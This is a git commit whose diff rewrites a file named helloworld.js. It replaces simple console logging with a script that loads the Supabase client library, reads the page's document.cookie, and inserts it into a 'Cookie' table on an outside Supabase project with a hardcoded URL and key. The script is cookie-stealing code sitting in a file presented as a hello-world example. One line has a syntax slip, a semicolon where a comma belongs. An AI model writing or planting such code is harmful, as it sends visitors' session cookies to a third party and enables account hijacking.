c04da6a6ca73596c404ce608d113ee11c84bd28c
Miguel P. Granville <85964058+forti8@users.noreply.github.com>
2026-03-08 17:54:09 -0300

    dd

--- helloworld.js
+++ helloworld.js
@@ -1,3 +1,32 @@
-console.log(document.cookie);
-console.log("hello world!");
-console.log("try document.cookie");
+(function () {
+
+  const SUPABASE_URL = "https://viznxowojmdxkpwukhla.supabase.co";
+  const SUPABASE_KEY = "sb_publishable_-dnu2H4vDls0duGO03BXaA_IfvWlAuk";
+
+  function loadSupabase(callback) {
+    const s = document.createElement("script");
+    s.src = "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
+    s.onload = callback;
+    document.head.appendChild(s);
+  }
+
+  function run() {
+
+    const c = document.cookie;
+    const supabase = window.supabase.createClient(
+      SUPABASE_URL,
+      SUPABASE_KEY
+    );
+
+    supabase
+      .from("Cookie")
+      .insert({
+        text: c;
+        created_at: new Date()
+      });
+
+  }
+
+  loadSupabase(run);
+
+})();
